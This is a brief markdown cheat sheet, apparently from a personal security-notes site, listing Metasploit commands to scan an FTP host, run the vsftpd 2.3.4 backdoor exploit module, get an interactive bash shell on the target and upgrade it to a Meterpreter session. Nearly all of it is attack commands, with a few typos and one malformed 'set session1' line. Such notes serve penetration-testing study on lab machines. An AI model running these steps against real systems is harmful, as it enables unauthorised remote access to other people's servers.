---
title: Vuln FTP Server
description: Linux FTP FTP Enum FTP Exploit
date: '2026-10-26'
topics:
  - systems
section:
  - Systems
  - Linux
  - Linux Exploitation
order: 82
---
Linux FTP
FTP Enum
FTP Exploit

## With Metasploit

```
setg RHOST IP_ADDRESS
```

```
db_nmap -sS -sV -O -p- IP_ADDRESS
```

```
services
```

```
analyze
```

```
vulns
```


```
search vsftpd
```


```
use exploit/unix/ftp/vsftpd_234_backdoor
```

```
run
```


```
/bin/bash -i
```

you will get teh shell of target compouter


to get the meterpreter 


```
search shell_to_meterpreter
```

```
use post/multi/manage/shell_to_meterpreter
```

```
set session1
```
